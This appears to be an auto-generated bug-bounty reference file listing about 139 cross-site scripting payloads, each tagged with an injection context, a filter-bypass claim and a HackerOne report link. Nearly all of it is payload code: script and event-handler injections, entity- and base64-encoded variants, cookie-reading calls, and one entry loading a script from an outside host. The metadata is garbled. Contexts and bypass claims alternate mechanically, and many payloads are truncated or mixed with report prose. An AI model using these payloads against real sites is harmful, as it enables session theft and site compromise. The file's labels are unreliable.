---
vuln_type: "XSS"
file_type: "payloads"
total_reports: "1563"
avg_bounty: "424"
max_bounty: "3800"
severity_distribution: "critical:1% high:2% medium:97% low:0%"
owasp_categories: ["A03:2021"]
common_cwe: ["CWE-79", "CWE-80"]
last_updated: "2026-04-09"
tags: ["XSS", "web", "api", "A03", "hunter-kb"]
related_vulns: ["Information_Disclosure", "Broken_Access_Control", "SSRF"]
---


# XSS — Payloads

 This payload structure operates reliably against standard implementations lacking modern security boundaries or active request filtering components.


> [!TIP]
> Always iterate. Test a canary token to figure out parsing logic, then increment to full payload structures.

> [!WARNING]
> Execute payloads explicitly only against authorized systems in accordance with program SLA scopes.

## Basic Payloads

#### Payload 1

```javascript
document.domain
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1003433](https://hackerone.com/reports/1003433)

#### Payload 2

```javascript
alert(document.domain)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1004833](https://hackerone.com/reports/1004833)

#### Payload 3

```javascript
alert(1)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1004964](https://hackerone.com/reports/1004964)

#### Payload 4

```javascript
<img src=x onerror=
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1010132](https://hackerone.com/reports/1010132)

#### Payload 5

```javascript
javascript:alert(
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1010316](https://hackerone.com/reports/1010316)

#### Payload 6

```javascript
document.cookie
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1010466](https://hackerone.com/reports/1010466)

#### Payload 7

```javascript
%22%3E%3C
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1010858](https://hackerone.com/reports/1010858)

#### Payload 8

```javascript
alert(document.cookie)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1011093](https://hackerone.com/reports/1011093)

#### Payload 9

```javascript
%3Cscript%3E
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1011463](https://hackerone.com/reports/1011463)

#### Payload 10

```javascript
onerror=alert(document.domain)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1011888](https://hackerone.com/reports/1011888)

#### Payload 11

```javascript
prompt(1)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1012249](https://hackerone.com/reports/1012249)

#### Payload 12

```javascript
alert()
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1014459](https://hackerone.com/reports/1014459)

#### Payload 13

```javascript
<script>alert(1)</script>
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1016253](https://hackerone.com/reports/1016253)

#### Payload 14

```javascript
confirm(document.domain)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1017189](https://hackerone.com/reports/1017189)

#### Payload 15

```javascript
<svg/onload=
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1022655](https://hackerone.com/reports/1022655)

#### Payload 16

```javascript
prompt(document.domain)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1023787](https://hackerone.com/reports/1023787)

#### Payload 17

```javascript
onerror=alert(1)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1024734](https://hackerone.com/reports/1024734)

#### Payload 18

```javascript
onerror=prompt(1)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1025125](https://hackerone.com/reports/1025125)

#### Payload 19

```javascript
alert('XSS')
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1025365](https://hackerone.com/reports/1025365)

#### Payload 20

```javascript
<svg onload=
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1028332](https://hackerone.com/reports/1028332)

#### Payload 21

```javascript
<script>alert(1);</script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1028396](https://hackerone.com/reports/1028396)

#### Payload 22

```javascript
alert(0)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1028820](https://hackerone.com/reports/1028820)

#### Payload 23

```javascript
alert(domain)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1029238](https://hackerone.com/reports/1029238)

#### Payload 24

```javascript
document.location
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1029243](https://hackerone.com/reports/1029243)

#### Payload 25

```javascript
confirm(666)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1029668](https://hackerone.com/reports/1029668)

#### Payload 26

```javascript
<script>alert(document.domain)</script>
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1031644](https://hackerone.com/reports/1031644)

#### Payload 27

```javascript
<script>alert(document.cookie)</script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1033253](https://hackerone.com/reports/1033253)

#### Payload 28

```javascript
onload=alert(document.domain)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1033832](https://hackerone.com/reports/1033832)

#### Payload 29

```javascript
prompt(0)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1033882](https://hackerone.com/reports/1033882)

#### Payload 30

```javascript
onerror=alert(domain)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1036877](https://hackerone.com/reports/1036877)

#### Payload 31

```javascript
onerror=alert(document.domain)%3E
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1036995](https://hackerone.com/reports/1036995)

#### Payload 32

```javascript
onload=alert(1)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1037714](https://hackerone.com/reports/1037714)

#### Payload 33

```javascript
<script>history.pushState('', '', '/')</script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1039750](https://hackerone.com/reports/1039750)

#### Payload 34

```javascript
onerror=prompt(document.domain)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1040533](https://hackerone.com/reports/1040533)

#### Payload 35

```javascript
document.write
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1040639](https://hackerone.com/reports/1040639)

#### Payload 36

```javascript
<img src=xx onerror=
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1042486](https://hackerone.com/reports/1042486)

#### Payload 37

```javascript
onerror="alert(document.domain)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1043804](https://hackerone.com/reports/1043804)

#### Payload 38

```javascript
onerror=alert(
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1049012](https://hackerone.com/reports/1049012)

#### Payload 39

```javascript
onerror=prompt(0);
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1050733](https://hackerone.com/reports/1050733)

#### Payload 40

```javascript
<img src=a onerror=
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1051369](https://hackerone.com/reports/1051369)

#### Payload 41

```javascript
alert(document.location)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1051373](https://hackerone.com/reports/1051373)

#### Payload 42

```javascript
onerror=prompt``
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1052856](https://hackerone.com/reports/1052856)

#### Payload 43

```javascript
<img src=1 onerror=
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1054382](https://hackerone.com/reports/1054382)

#### Payload 44

```javascript
alert(%27xss%27)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1054526](https://hackerone.com/reports/1054526)

#### Payload 45

```javascript
alert(origin)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1056953](https://hackerone.com/reports/1056953)

#### Payload 46

```javascript
onload=%22prompt(1)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1057419](https://hackerone.com/reports/1057419)

#### Payload 47

```javascript
onerror=alert()
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1058427](https://hackerone.com/reports/1058427)

#### Payload 48

```javascript
prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1059395](https://hackerone.com/reports/1059395)

#### Payload 49

```javascript
onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1061199](https://hackerone.com/reports/1061199)

#### Payload 50

```javascript
onerror=alert(document.cookie)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1062380](https://hackerone.com/reports/1062380)

#### Payload 51

```javascript
<img src="x" onerror=
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1064095](https://hackerone.com/reports/1064095)

#### Payload 52

```javascript
onauxclick=confirm(document.domain)%3ERIGHT%20CLICK%20HERE
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1065167](https://hackerone.com/reports/1065167)

#### Payload 53

```javascript
prompt(1337)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1065830](https://hackerone.com/reports/1065830)

#### Payload 54

```javascript
onerror= alert(document.cookie)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1065964](https://hackerone.com/reports/1065964)

#### Payload 55

```javascript
">
      <
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1066607](https://hackerone.com/reports/1066607)

#### Payload 56

```javascript
alert('xss')
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1068412](https://hackerone.com/reports/1068412)

## Context-Specific Payloads

#### Payload 57

```javascript
<script>alert('xss')</script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1068477](https://hackerone.com/reports/1068477)

#### Payload 58

```javascript
alert("XSS")
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1069527](https://hackerone.com/reports/1069527)

#### Payload 59

```javascript
confirm(3)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1069528](https://hackerone.com/reports/1069528)

#### Payload 60

```javascript
%3cscript%3e
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1070259](https://hackerone.com/reports/1070259)

#### Payload 61

```javascript
onfocus=Function(
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1070859](https://hackerone.com/reports/1070859)

#### Payload 62

```javascript
%22%3e%3c
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1071524](https://hackerone.com/reports/1071524)

#### Payload 63

```javascript
alert(%22xElkomy%22)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1072616](https://hackerone.com/reports/1072616)

#### Payload 64

```javascript
<img src=/ onerror=
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1072868](https://hackerone.com/reports/1072868)

#### Payload 65

```javascript
<svg src=x onload=
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1073514](https://hackerone.com/reports/1073514)

#### Payload 66

```javascript
onload=confirm(document.domain);
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1073571](https://hackerone.com/reports/1073571)

#### Payload 67

```javascript
<script src=https://monty.xss.ht></script>
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1073712](https://hackerone.com/reports/1073712)

#### Payload 68

```javascript
alert(%27Reflected%20XSS%27)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1073725](https://hackerone.com/reports/1073725)

#### Payload 69

```javascript
alert(%27Reflected%20XSS%20here%27)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1077136](https://hackerone.com/reports/1077136)

#### Payload 70

```javascript
onfocus=%27confirm(document.domain)%27name=%27simo%27#simo`
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1081656](https://hackerone.com/reports/1081656)

#### Payload 71

```javascript
onerror=alert(document.cookie);
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1081747](https://hackerone.com/reports/1081747)

#### Payload 72

```javascript
prompt(document.cookie)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1081994](https://hackerone.com/reports/1081994)

#### Payload 73

```javascript
onerror="prompt(document.cookie)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1083231](https://hackerone.com/reports/1083231)

#### Payload 74

```javascript
alert('boo')
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1083376](https://hackerone.com/reports/1083376)

#### Payload 75

```javascript
onerror=alert(document.domain)%3E&search=A
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1083734](https://hackerone.com/reports/1083734)

#### Payload 76

```javascript
onerror=ale...
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1084156](https://hackerone.com/reports/1084156)

#### Payload 77

```javascript
onload=alert(%22nagli%22)%3E
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1084183](https://hackerone.com/reports/1084183)

#### Payload 78

```javascript
alert(%22nagli%22)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1085546](https://hackerone.com/reports/1085546)

#### Payload 79

```javascript
<ScRiPt >gQmT(9082)</ScRiPt>
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1085914](https://hackerone.com/reports/1085914)

#### Payload 80

```javascript
alert("nagli")
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1087061](https://hackerone.com/reports/1087061)

#### Payload 81

```javascript
onload='alert(document.domain)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1087122](https://hackerone.com/reports/1087122)

#### Payload 82

```javascript
onmouseover="alert(1)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1091118](https://hackerone.com/reports/1091118)

#### Payload 83

```javascript
OnLoad=alert(1)%3E
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1091165](https://hackerone.com/reports/1091165)

#### Payload 84

```javascript
onerror=alert(document.domain)%3E&text=`
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1092678](https://hackerone.com/reports/1092678)

#### Payload 85

```javascript
onmouseover="alert(
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1093577](https://hackerone.com/reports/1093577)

#### Payload 86

```javascript
alert(/frenchvlad/)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1094224](https://hackerone.com/reports/1094224)

#### Payload 87

```javascript
<script>alert(/frenchvlad/);</script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1094276](https://hackerone.com/reports/1094276)

#### Payload 88

```javascript
onerror=(alert)(1)%3E
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1095765](https://hackerone.com/reports/1095765)

#### Payload 89

```javascript
onerror=(alert)(1)/
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1095797](https://hackerone.com/reports/1095797)

#### Payload 90

```javascript
prompt(/hacked/)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1095934](https://hackerone.com/reports/1095934)

#### Payload 91

```javascript
OnMoUsEoVeR=prompt(/hacked/)//`
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1096058](https://hackerone.com/reports/1096058)

#### Payload 92

```javascript
alert(%27Renzi%27)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1096061](https://hackerone.com/reports/1096061)

#### Payload 93

```javascript
alert(31337)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1097217](https://hackerone.com/reports/1097217)

#### Payload 94

```javascript
<script>alert(0)</script>
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1097979](https://hackerone.com/reports/1097979)

#### Payload 95

```javascript
alert(location)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1100096](https://hackerone.com/reports/1100096)

#### Payload 96

```javascript
atob(
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1100326](https://hackerone.com/reports/1100326)

#### Payload 97

```javascript
onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1101500](https://hackerone.com/reports/1101500)

#### Payload 98

```javascript
eval(
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1102018](https://hackerone.com/reports/1102018)

#### Payload 99

```javascript
confirm(1337)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1103033](https://hackerone.com/reports/1103033)

#### Payload 100

```javascript
prompt()
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1103258](https://hackerone.com/reports/1103258)

#### Payload 101

```javascript
onerror=alert(document.domain)%253E
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1103298](https://hackerone.com/reports/1103298)

#### Payload 102

```javascript
onerror=aler...
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1106238](https://hackerone.com/reports/1106238)

#### Payload 103

```javascript
<object src=1 onerror=
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #11073](https://hackerone.com/reports/11073)

#### Payload 104

```javascript
onerror="javascript:alert(1);
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1107726](https://hackerone.com/reports/1107726)

#### Payload 105

```javascript
onload=confirm(document.domain)%3E
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1108420](https://hackerone.com/reports/1108420)

#### Payload 106

```javascript
alert(9868)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1108504](https://hackerone.com/reports/1108504)

#### Payload 107

```javascript
&#60;img src=x onerror=prompt
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1110229](https://hackerone.com/reports/1110229)

#### Payload 108

```javascript
&#60;img src=x... This report describes a XSS issue affecting the target application surface. The disclosed finding is titled "Stored XSS in Question edit from..." and indicates exploitable input handling weaknesses. Observed report context: Hi @judgeme! Step to reproduce: 1. Log in to your shopify account and create product with name `">&#60;img src=x onerror=prompt
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1110243](https://hackerone.com/reports/1110243)

#### Payload 109

```javascript
onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#4...
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1115763](https://hackerone.com/reports/1115763)

#### Payload 110

```javascript
&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1121900](https://hackerone.com/reports/1121900)

#### Payload 111

```javascript
&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1122513](https://hackerone.com/reports/1122513)

## Advanced Payloads

#### Payload 112

```javascript
onerror=prompt(document.domain)&#62;`...
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #112372](https://hackerone.com/reports/112372)

#### Payload 113

```javascript
onerror=prompt(document.domain)&#62;
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1126433](https://hackerone.com/reports/1126433)

#### Payload 114

```javascript
&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x... This report describes a XSS issue affecting the target application surface. The disclosed finding is titled "Stored XSS in Question edit for..." and indicates exploitable input handling weaknesses. Observed report context: Hi @judgeme! Step to reproduce: 1. Log in to your shopify account and create product with name `&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1131887](https://hackerone.com/reports/1131887)

#### Payload 115

```javascript
onerror=prompt(document.domain)&#62;`
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1132202](https://hackerone.com/reports/1132202)

#### Payload 116

```javascript
onload=alert(1)%3E████
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1143776](https://hackerone.com/reports/1143776)

#### Payload 117

```javascript
onload=alert(1)%3E█████████
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1143780](https://hackerone.com/reports/1143780)

#### Payload 118

```javascript
<img src="<img src=search"/onerror=
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1143783](https://hackerone.com/reports/1143783)

#### Payload 119

```javascript
onerror=alert(document.domain)//
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1145162](https://hackerone.com/reports/1145162)

#### Payload 120

```javascript
onerror=prompt(document.domain)%3E/messages
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1145712](https://hackerone.com/reports/1145712)

#### Payload 121

```javascript
onerror=alert(/xss/)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1147060](https://hackerone.com/reports/1147060)

#### Payload 122

```javascript
alert(/xss/)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1147176](https://hackerone.com/reports/1147176)

#### Payload 123

```javascript
<img src="/foo onerror=
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1147433](https://hackerone.com/reports/1147433)

#### Payload 124

```javascript
onerror=javascript:alert(document.cookie)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1148364](https://hackerone.com/reports/1148364)

#### Payload 125

```javascript
onerror=alert(domain)%3EResources&ID=17263
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1149144](https://hackerone.com/reports/1149144)

#### Payload 126

```javascript
alert(%2fxss%2f)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1154378](https://hackerone.com/reports/1154378)

#### Payload 127

```javascript
onload=alert(document.domain)%3E%3C/iframe%3E]
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1158823](https://hackerone.com/reports/1158823)

#### Payload 128

```javascript
onerror=prompt(document.domain)%3Ember_id&sort_dir=desc
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1159255](https://hackerone.com/reports/1159255)

#### Payload 129

```javascript
onerror=prompt(document.domain)%3Ember_id
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1159362](https://hackerone.com/reports/1159362)

#### Payload 130

```javascript
alert('XSS Success!')
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1159371](https://hackerone.com/reports/1159371)

#### Payload 131

```javascript
<script>prompt(1)</script>
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1161241](https://hackerone.com/reports/1161241)

#### Payload 132

```javascript
<IMG SRC=x onerror=
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #116135](https://hackerone.com/reports/116135)

#### Payload 133

```javascript
alert(&quot;XSS-by-Imran&quot;)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1164853](https://hackerone.com/reports/1164853)

#### Payload 134

```javascript
onerror=javascript:alert(&quot;XSS-by-Imran&quot;)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1165540](https://hackerone.com/reports/1165540)

#### Payload 135

```javascript
<img onerror=
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1165919](https://hackerone.com/reports/1165919)

#### Payload 136

```javascript
alert(%27XSS%20Success!%27)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1166766](https://hackerone.com/reports/1166766)

#### Payload 137

```javascript
<script>prompt(1337)</script>
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1166770](https://hackerone.com/reports/1166770)

#### Payload 138

```javascript
onerror=alert(1);//.png
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1166918](https://hackerone.com/reports/1166918)

#### Payload 139

```javascript
<svg%20onload=
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
